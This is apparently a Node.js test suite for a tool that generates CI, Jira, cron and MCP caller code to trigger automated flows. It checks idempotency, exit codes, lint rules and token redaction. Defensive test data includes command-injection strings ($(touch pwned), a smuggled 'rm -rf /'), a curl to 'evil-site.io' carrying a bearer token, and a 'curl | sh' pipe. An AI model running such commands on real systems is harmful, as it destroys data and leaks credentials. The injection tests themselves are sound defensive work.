// Integration helper end to end: for each of the 12 callers the generated code is EXECUTED against the server by a
// simulator of that system (Jira Automation, Jenkins Linux/Windows agents, GitHub/Bitbucket/GitLab runners, scheduled
// task, cron, Python, Claude Code via MCP, generic webhook) with hostile data in the caller's variables. Checks that
// the run arrives with the right input, vars, source and Idempotency-Key, that retries replay, that failures give
// the documented exit codes, plus reachability, public URL, lint, AI adaptation (mock) and the template verifier.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { startServer, role, cmd, ROOT, hasBin } from './helpers/harness.mjs';
import * as sim from './helpers/callers.mjs';

let s; let flow; let failing;
const HOSTILE = `qa'job"$(touch pwned)\`id\`;&|%PATH%`;
const tools = {};
before(async () => {
  s = await startServer({ name: 'integ' }); await s.start();
  tools.python = await hasBin('python', ['--version']);
  tools.bash = await hasBin(sim.BASH, ['-c', 'exit 0']);
  tools.ps = await hasBin(process.platform === 'win32' ? 'powershell.exe' : 'pwsh', ['-NoProfile', '-Command', 'exit 0']);
  flow = await s.flow('Integración QA', [
    cmd('Recibir', 'Write-Output "in={{input}}|issue={{vars.issue}}"', { id: 's_recv' }),
    role('Comentar en Jira', 'Comenta en {{vars.issue}} [[mock:tool mcp__claude_ai_Atlassian_Rovo__addCommentToJiraIssue]] [[mock:say comentado]]', { id: 's_comment', allowedTools: 'mcp__claude_ai_Atlassian_Rovo' }),
  ], [['s_recv', 's_comment']], { vars: { issue: '' } });
  failing = await s.flow('Falla en CI', [cmd('Tests', 'Write-Error "3 tests fallaron"; exit 1')]);
});
after(async () => { await s?.stop(); });

const gen = async (caller, options = {}, f = flow) => {
  const r = await s.ui('POST', '/api/integrations/generate', { flow: f.id, caller, options });
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.deepEqual(r.body.lint.errors, [], `${caller}: lint ${JSON.stringify(r.body.lint.errors)}`);
  assert.ok(!JSON.stringify(r.body).includes(s.token), 'el token nunca aparece en lo generado');
  return r.body;
};
/** The run the simulated caller produced, checked against what the caller sent. */
const runOf = async (res, f = flow) => {
  assert.ok(res.runId, `sin runId: ${res.stderr || JSON.stringify(res.body)}`);
  return s.waitRun(f.id, res.runId, 60000);
};
const work = () => s.dirs.work;

test('Jira Cloud (Automation, vía túnel): smart values con comillas/saltos llegan intactos, fire-and-forget, el flujo comenta en Jira, reintento = misma ejecución', async () => {
  const g = await gen('jira-cloud', { vars: { issue: '{{issue.key}}' } });
  assert.equal(g.reachability.status, 'needs-tunnel');
  assert.ok(g.reachability.options.some((o) => o.id === 'cloudflare' && /\^\/api\/ext\//.test(o.config)));
  const issue = { key: 'SBK-42', id: '10042', summary: 'Fallo "crítico" en $(whoami) & pagos\nlínea 2 \\ fin', updated: '20261112093000' };
  const r = await sim.jira(g, { token: s.token, issue, base: s.base });
  assert.equal(r.code, 200);
  assert.equal(r.body.status, 'running', 'no espera (Jira corta a los ~30 s)');
  const run = await runOf(r);
  assert.equal(run.status, 'success', JSON.stringify(Object.values(run.steps).map((x) => x.error)));
  assert.equal(run.input, `SBK-42: ${issue.summary}`);
  assert.equal(run.vars.issue, 'SBK-42');
  assert.equal(run.trigger, 'jira-cloud', 'source = id del origen (D35): así se enciende "llamada recibida" en el asistente');
  assert.equal(run.idempotencyKey, 'afs-SBK-42-20261112093000');
  assert.equal(run.steps.s_comment.actions[0].tool, 'addCommentToJiraIssue');
  const again = await sim.jira(g, { token: s.token, issue, base: s.base });
  assert.equal(again.body.runId, r.runId);
  assert.equal(again.body.idempotentReplay, true);
  const log = await s.uiOk('GET', '/api/integrations/inbound?since=0');
  assert.ok(log.some((e) => e.runId === r.runId && e.forwardedFor === '18.1.2.3' && /Automation for Jira/.test(e.userAgent)));
});

test('Jira Data Center: mismo contrato, origen jira-dc, modo wait (respuesta con el resultado)', async () => {
  const g = await gen('jira-dc', { vars: { issue: '{{issue.key}}' }, mode: 'wait', location: 'local' });
  assert.match(sim.renderJira(g.files.find((f) => f.name === 'cuerpo-web-request.json').content, { key: 'K-1', summary: 'x', updated: '1' }), /"wait": true/);
  const r = await sim.jira(g, { token: s.token, issue: { key: 'DC-7', id: '7', summary: 'Resumen DC', updated: '20260101000000' } });
  assert.equal(r.body.status, 'success');
  assert.match(r.body.result, /comentado/);
  const run = await runOf(r);
  assert.equal(run.trigger, 'jira-dc');
  assert.equal(run.vars.issue, 'DC-7');
});

for (const variant of [{ id: 'jenkins-declarative', unix: true }, { id: 'jenkins-scripted', unix: true }, { id: 'jenkins-declarative', unix: false }]) {
  test(`${variant.id} (agente ${variant.unix ? 'Linux: sh + python3' : 'Windows: powershell'}): BUILD_* hostiles llegan literales, Idempotency-Key = BUILD_TAG, artefacto afs-result.json`, async (t) => {
    if (variant.unix ? !(tools.bash && tools.python) : !tools.ps) return t.skip('falta bash/python o powershell');
    const g = await gen(variant.id, { vars: { issue: '${ISSUE_KEY}' }, location: 'local' });
    assert.match(g.files.find((f) => f.name === 'Jenkinsfile').content, variant.id === 'jenkins-declarative' ? /pipeline \{/ : /node \{/);
    const tag = `jenkins-${variant.id}-${variant.unix ? 'lin' : 'win'}-${Date.now()}`;
    const env = { AFS_TOKEN: s.token, BUILD_TAG: tag, JOB_NAME: HOSTILE, BUILD_NUMBER: '7', GIT_COMMIT: 'abc123', ISSUE_KEY: 'SBK-1"; rm -rf / #' };
    const r = await sim.jenkins(g, { root: work(), env, unix: variant.unix });
    assert.equal(r.code, 0, r.stderr);
    const run = await runOf(r);
    assert.equal(run.input, `${HOSTILE} #7 (abc123)`);
    assert.equal(run.vars.issue, env.ISSUE_KEY);
    assert.equal(run.trigger, variant.id);
    assert.equal(run.idempotencyKey, tag);
    assert.match(r.stdout, /comentado/, 'el resultado sale por stdout');
    const again = await sim.jenkins(g, { root: work(), env, unix: variant.unix });
    assert.equal(again.runId, r.runId, 'reintentar el build no lanza otra ejecución');
    assert.match(again.stderr, /reutilizada por Idempotency-Key/);
  });
}

test('Jenkins remoto (on-prem): la base de red se reemplaza por la real y un flujo que falla rompe el stage con exit 1', async (t) => {
  if (!(tools.bash && tools.python)) return t.skip('falta bash/python');
  const g = await gen('jenkins-declarative', {}, failing);
  assert.equal(g.reachability.status, 'needs-host');
  assert.match(g.files.find((f) => f.name === 'Jenkinsfile').content, /withCredentials\(\[string\(credentialsId: 'afs-token', variable: 'AFS_TOKEN'\)\]\)/);
  const r = await sim.jenkins(g, { root: work(), env: { AFS_TOKEN: s.token, BUILD_TAG: `fail-${Date.now()}`, JOB_NAME: 'j', BUILD_NUMBER: '1', GIT_COMMIT: 'c' }, baseFrom: g.reachability.base, baseTo: s.base });
  assert.equal(r.code, 1);
  assert.match(r.stderr, /\[error\] Tests EXIT_NONZERO/);
  const bad = await sim.jenkins(g, { root: work(), env: { AFS_TOKEN: 'malo', BUILD_TAG: 'x', JOB_NAME: 'j', BUILD_NUMBER: '1', GIT_COMMIT: 'c' }, baseFrom: g.reachability.base, baseTo: s.base });
  assert.equal(bad.code, 2, 'token inválido → exit 2');
  assert.match(bad.stderr, /401: UNAUTHORIZED/);
  const down = await sim.jenkins(g, { root: work(), env: { AFS_TOKEN: s.token, BUILD_TAG: 'y', JOB_NAME: 'j', BUILD_NUMBER: '1', GIT_COMMIT: 'c' }, baseFrom: g.reachability.base, baseTo: 'http://127.0.0.1:9' });
  assert.equal(down.code, 2, 'servidor inalcanzable → exit 2');
});

for (const local of [false, true]) {
  test(`GitHub Actions (${local ? 'runner self-hosted en esta PC' : 'ubuntu-latest vía túnel'}): datos de github.* vía env, nunca en el script`, async (t) => {
    if (local ? !tools.ps : !(tools.bash && tools.python)) return t.skip('falta el shell');
    const g = await gen('github-actions', { vars: { issue: '${{ github.event.inputs.issue }}' }, ...(local ? { location: 'local' } : {}) });
    const yml = g.files.find((f) => f.name === '.github/workflows/agent-flow.yml').content;
    assert.ok(!/run: \|[\s\S]*\$\{\{/.test(yml.split('run: |')[1].split('- uses')[0]), 'el script no interpola ${{ }}');
    const ctx = { repository: `org/re"po$(id)`, sha: 'deadbeef', run_id: String(Date.now()), run_attempt: '1', 'event.inputs.issue': 'GH-9' };
    const r = await sim.github(g, { root: work(), ctx, token: s.token, ...(local ? {} : { baseFrom: g.reachability.base, baseTo: s.base }) });
    assert.equal(r.code, 0, r.stderr);
    const run = await runOf(r);
    assert.equal(run.input, `${ctx.repository}@deadbeef`);
    assert.equal(run.vars.issue, 'GH-9');
    assert.equal(run.trigger, 'github-actions');
    assert.equal(run.idempotencyKey, `${ctx.repository}-${ctx.run_id}-1`);
  });
}

for (const [caller, fn, envOf] of [
  ['bitbucket-pipelines', sim.bitbucket, (n) => ({ BITBUCKET_REPO_SLUG: `repo'"${n}`, BITBUCKET_BUILD_NUMBER: n, BITBUCKET_COMMIT: 'c0ffee' })],
  ['gitlab-ci', sim.gitlab, (n) => ({ CI_PROJECT_PATH: `grp/pr'"oj`, CI_COMMIT_SHA: 'f00d', CI_PROJECT_ID: '5', CI_PIPELINE_ID: n, CI_JOB_ID: '9' })],
]) {
  for (const local of [false, true]) {
    test(`${caller} (${local ? 'runner local (PowerShell)' : 'nube vía túnel (python)'}): input, vars, clave natural y resultado`, async (t) => {
      if (local ? !tools.ps : !(tools.bash && tools.python)) return t.skip('falta el shell');
      const g = await gen(caller, { vars: { issue: '$TICKET' }, ...(local ? { location: 'local' } : {}) });
      const n = String(Date.now());
      const env = { AFS_TOKEN: s.token, TICKET: `T-${n}`, ...envOf(n) };
      const r = await fn(g, { root: work(), env, ...(local ? {} : { baseFrom: g.reachability.base, baseTo: s.base }) });
      assert.equal(r.code, 0, r.stderr);
      const run = await runOf(r);
      assert.equal(run.trigger, caller);
      assert.equal(run.vars.issue, `T-${n}`);
      assert.equal(run.input, caller === 'gitlab-ci' ? `grp/pr'"oj@f00d` : `repo'"${n}@c0ffee`);
      assert.equal(run.idempotencyKey, caller === 'gitlab-ci' ? `5-${n}-9` : `repo'"${n}-${n}`);
    });
  }
}

test('Tarea programada de Windows (PowerShell): ejecutar-flujo.ps1 + afs-call.ps1, clave tarea-{NOW}', async (t) => {
  if (!tools.ps) return t.skip('falta powershell');
  const g = await gen('powershell-task', { input: 'Reporte diario de {USERNAME}', vars: { issue: 'DAILY' } });
  const r = await sim.scheduledTask(g, { root: work(), env: { AFS_TOKEN: s.token, USERNAME: 'qa"user' } });
  assert.equal(r.code, 0, r.stderr);
  const run = await runOf(r);
  assert.equal(run.input, 'Reporte diario de qa"user');
  assert.equal(run.trigger, 'powershell-task');
  assert.match(run.idempotencyKey, /^tarea-\d{12}$/);
});

test('cron + bash: token leído de ~/.afs_token, clave cron-{NOW}', async (t) => {
  if (!(tools.bash && tools.python)) return t.skip('falta bash/python');
  const g = await gen('bash-cron', { input: 'nightly', location: 'local' });
  const r = await sim.cron(g, { root: work(), token: s.token });
  assert.equal(r.code, 0, r.stderr);
  const run = await runOf(r);
  assert.equal(run.input, 'nightly');
  assert.match(run.idempotencyKey, /^cron-\d{12}$/);
});

test('Script Python: ejemplo.py llama a afs_call.py con un UUID como clave', async (t) => {
  if (!tools.python) return t.skip('falta python');
  const g = await gen('python', { input: 'desde python', vars: { issue: 'PY-1' }, location: 'local' });
  const t0 = Date.now();
  const r = await sim.python(g, { root: work(), env: { AFS_TOKEN: s.token } });
  assert.equal(r.code, 0, r.stderr);
  assert.match(r.stdout, /comentado/);
  const runs = (await s.uiOk('GET', `/api/flows/${flow.id}/runs`)).filter((x) => x.trigger === 'python' && x.startedAt >= t0);
  assert.equal(runs.length, 1);
  const run = await s.uiOk('GET', `/api/flows/${flow.id}/runs/${runs[0].id}`);
  assert.equal(run.vars.issue, 'PY-1');
  assert.match(run.idempotencyKey, /^[0-9a-f-]{36}$/);
});

test('Claude Code / otro agente vía MCP: el comando de registro levanta el MCP y run_flow ejecuta', async () => {
  const g = await gen('claude-mcp', { input: 'SBK-77' });
  assert.equal(g.reachability.status, 'ok-local');
  assert.match(g.files.find((f) => f.name === 'ejemplo-prompt.txt').content, /Ejecuta el flujo "Integración QA"/);
  const r = await sim.claudeMcp(g, { env: { AFS_URL: s.base, AFS_DATA: s.dirs.data }, flow: 'Integración QA', input: 'SBK-77' });
  assert.equal(r.code, 0);
  const run = await runOf(r);
  assert.equal(run.trigger, 'mcp');
  assert.equal(run.input, 'SBK-77');
});

test('Webhook genérico: cuerpo de la plantilla con header, payload propio de la herramienta, y ?token= como último recurso', async () => {
  const g = await gen('webhook', { vars: { issue: 'WH-1' } });
  assert.ok(g.lint.warnings.length >= 0);
  const base = g.reachability.base;
  const g2 = { ...g, files: g.files.map((f) => ({ ...f, content: f.content.split(base).join(s.base) })) };
  const r = await sim.webhook(g2, { token: s.token });
  assert.equal(r.code, 200);
  let run = await runOf(r);
  assert.equal(run.trigger, 'webhook');
  assert.equal(run.vars.issue, 'WH-1');
  const own = await sim.webhook(g2, { token: s.token, payload: { event: 'deploy', env: 'qa' } });
  run = await runOf(own);
  assert.match(run.input, /"event": "deploy"/, 'el JSON propio de la herramienta llega como input');
  const q = await sim.webhook(g2, { token: s.token, payload: { input: 'por query' }, viaQuery: true });
  run = await runOf(q);
  assert.equal(run.input, 'por query');
  assert.equal(run.trigger, 'webhook');
});

test('alcance y URL pública: local/on-prem/nube, solo https sin credenciales, se usa en lo generado', async () => {
  const reach = async (caller, location) => (await gen(caller, location ? { location } : {})).reachability.status;
  assert.equal(await reach('powershell-task'), 'ok-local');
  assert.equal(await reach('jenkins-declarative'), 'needs-host');
  assert.equal(await reach('github-actions'), 'needs-tunnel');
  assert.equal(await reach('github-actions', 'local'), 'ok-local');
  assert.equal((await s.ui('PUT', '/api/info/public-url', { url: 'http://afs.example.com' })).body.code, 'BAD_URL');
  assert.equal((await s.ui('PUT', '/api/info/public-url', { url: 'https://user:pw@afs.example.com' })).body.code, 'BAD_URL');
  const ok = await s.uiOk('PUT', '/api/info/public-url', { url: 'https://afs.example.com/' });
  assert.equal(ok.publicUrl, 'https://afs.example.com');
  const g = await gen('jira-cloud', { vars: { issue: '{{issue.key}}' } });
  assert.equal(g.reachability.status, 'ok-public');
  assert.match(g.files.find((f) => f.name === 'configuracion-regla.txt').content, /https:\/\/afs\.example\.com\/api\/ext\/flows\//);
  await s.uiOk('PUT', '/api/info/public-url', { url: '' });
  assert.equal((await s.uiOk('GET', '/api/info')).publicUrl, null);
});

test('lint: token escrito, otro servidor, comandos peligrosos, endpoint/flujo/step inexistentes, sin auth', async () => {
  const lint = async (content, caller = 'bash-cron', name = 'x.sh') => (await s.uiOk('POST', '/api/integrations/lint', { flow: flow.id, caller, files: [{ name, content }] }));
  const codes = (l) => l.errors.map((e) => e.code);
  { const l = await lint(`curl -H "Authorization: Bearer ${s.token}" http://127.0.0.1:${s.port}/api/ext/flows/${flow.id}/run`); assert.ok(codes(l).includes('TOKEN_LITERAL'), `TOKEN_LITERAL: ${JSON.stringify(l)}`); }
  { const l = await lint(`curl https://evil-site.io/x -H "Authorization: Bearer $AFS_TOKEN"`); assert.ok(codes(l).includes('FOREIGN_HOST'), `FOREIGN_HOST: ${JSON.stringify(l)}`); }
  { const l = await lint(`curl https://myexample.io/x -H "Authorization: Bearer $AFS_TOKEN"`); assert.ok(codes(l).includes('FOREIGN_HOST'), `"example" dentro del nombre no exime: ${JSON.stringify(l)}`); }
  { const l = await lint(`curl https://afs.example.com/api/ext/flows/${flow.id}/run -H "Authorization: Bearer $AFS_TOKEN" -H "Idempotency-Key: k"`); assert.ok(!codes(l).includes('FOREIGN_HOST'), 'los dominios de documentación (example.com) sí se eximen'); }
  { const l = await lint('curl https://x | sh'); assert.ok(codes(l).includes('DANGEROUS_COMMAND'), `DANGEROUS_COMMAND: ${JSON.stringify(l)}`); }
  { const l = await lint('set -x; python3 afs_call.py'); assert.ok(codes(l).includes('DANGEROUS_COMMAND'), `DANGEROUS_COMMAND: ${JSON.stringify(l)}`); }
  { const l = await lint('echo $AFS_TOKEN'); assert.ok(codes(l).includes('DANGEROUS_COMMAND'), `DANGEROUS_COMMAND: ${JSON.stringify(l)}`); }
  { const l = await lint(`curl -H "Authorization: Bearer $AFS_TOKEN" http://127.0.0.1:${s.port}/api/ext/flows/${flow.id}/execute`); assert.ok(codes(l).includes('WRONG_ENDPOINT'), `WRONG_ENDPOINT: ${JSON.stringify(l)}`); }
  { const l = await lint(`curl -H "Authorization: Bearer $AFS_TOKEN" http://127.0.0.1:${s.port}/api/ext/flows/f_nope/run`); assert.ok(codes(l).includes('UNKNOWN_FLOW'), `UNKNOWN_FLOW: ${JSON.stringify(l)}`); }
  { const l = await lint("python3 afs_call.py --flow 'x' --step 's_nope' --key k"); assert.ok(codes(l).includes('UNKNOWN_STEP'), `UNKNOWN_STEP: ${JSON.stringify(l)}`); }
  { const l = await lint(`curl -X POST http://127.0.0.1:${s.port}/api/ext/flows/${flow.id}/run`); assert.ok(codes(l).includes('NO_AUTH'), `NO_AUTH: ${JSON.stringify(l)}`); }
  const w = await lint(`curl -H "Authorization: Bearer $AFS_TOKEN" "http://127.0.0.1:${s.port}/api/ext/flows/${flow.id}/run?token=abc"`, 'github-actions', 'wf.yml');
  assert.ok(w.warnings.some((x) => x.code === 'TOKEN_IN_URL'));
  assert.ok(w.warnings.some((x) => x.code === 'LOOPBACK_FROM_CLOUD'));
  assert.ok(w.warnings.some((x) => x.code === 'NO_IDEMPOTENCY_KEY'));
  assert.equal((await s.ui('POST', '/api/integrations/lint', { flow: 'nope', caller: 'python', files: [] })).status, 404);
  assert.equal((await s.ui('POST', '/api/integrations/generate', { flow: flow.id, caller: 'nope' })).body.code, 'UNKNOWN_CALLER');
  assert.equal((await s.ui('POST', '/api/integrations/generate', { flow: flow.id, caller: 'python', options: { step: 's_nope' } })).body.code, 'STEP_NOT_FOUND');
});

test('Adaptar con IA (mock): parte de la plantilla, el token nunca llega a la IA, corrige 1 vez si el lint falla, error claro si no es JSON', async () => {
  const n = s.calls().length;
  const r = await s.uiOk('POST', '/api/integrations/generate', { flow: flow.id, caller: 'jira-cloud', ai: true, description: `cuando un ticket de SBK pasa a QA, ejecutar y comentar. Mi token es ${s.token}`, options: { vars: { issue: '{{issue.key}}' } } });
  assert.equal(r.ai.used, true);
  assert.equal(r.ai.corrected, false);
  assert.ok(r.setup.includes('Paso adaptado por IA (mock)'));
  assert.deepEqual(r.lint.errors, []);
  const call = s.callsSince(n).find((c) => /Adaptas integraciones/.test(c.system));
  assert.ok(!call.prompt.includes(s.token), 'el token se redacta antes de enviar la descripción');
  assert.match(call.prompt, /<token-eliminado>/);
  assert.equal(s.argOf(call, '--tools'), '');
  const fixed = await s.uiOk('POST', '/api/integrations/generate', { flow: flow.id, caller: 'bash-cron', ai: true, description: 'cron nocturno [[mock:adapt-token]]' });
  assert.equal(fixed.ai.corrected, true);
  assert.deepEqual(fixed.lint.errors, []);
  assert.ok(fixed.files.some((f) => f.name === 'afs_call.py'), 'los clientes se agregan siempre');
  const garbage = await s.ui('POST', '/api/integrations/generate', { flow: flow.id, caller: 'python', ai: true, description: 'x [[mock:adapt-garbage]]' });
  assert.equal(garbage.status, 400);
  assert.match(garbage.body.error, /JSON válido/);
});

test('verificador de plantillas (scripts/verify/int-templates.mjs): 12 orígenes × local/remoto × nombre hostil parsean y pasan lint', async () => {
  const r = await s.exec(process.execPath, [path.join(ROOT, 'scripts', 'verify', 'int-templates.mjs')], { env: { AFS_URL: s.base }, timeoutMs: 300000 });
  assert.equal(r.code, 0, r.stdout.split('\n').filter((l) => l.startsWith('FAIL')).join('\n'));
  assert.match(r.stdout, /(\d+)\/\1 passed/);
});

test('review: Jira: barras invertidas, comillas y claves raras en el cuerpo dan JSON válido y no inyectan campos', async () => {
  const g = await gen('jira-cloud', { input: String.raw`ruta C:\temp\x "fin\" y {{issue.key}}`, vars: { 'clave"rara': '{{issue.key}}', ruta: String.raw`x\", "usePins": true, "z": "` } });
  const body = JSON.parse(sim.renderJira(g.files.find((f) => f.name === 'cuerpo-web-request.json').content, { key: 'K-1', summary: 's', updated: '1' }));
  assert.equal(body.input, String.raw`ruta C:\temp\x "fin\" y K-1`);
  assert.equal(body.vars['clave"rara'], 'K-1');
  assert.equal(body.vars.ruta, String.raw`x\", "usePins": true, "z": "`);
  assert.equal(body.usePins, undefined, 'no se inyectó usePins');
});

test('review: PowerShell: apóstrofos tipográficos en datos literales no rompen ni inyectan (tarea programada)', async (t) => {
  if (!tools.ps) return t.skip('falta powershell');
  const g = await gen('powershell-task', { input: 'don’t; Write-Output INYECTADO; ‘x', idempotencyKey: `apos-${Date.now()}` }); // own key: the default tarea-{NOW} collides with the other scheduled-task test in the same minute
  const r = await sim.scheduledTask(g, { root: work(), env: { AFS_TOKEN: s.token } });
  assert.equal(r.code, 0, r.stderr);
  const run = await runOf(r);
  assert.equal(run.input, 'don’t; Write-Output INYECTADO; ‘x');
  assert.ok(!r.stdout.includes('INYECTADO\n') || r.stdout.includes('don’t'), 'el texto llegó como dato');
});
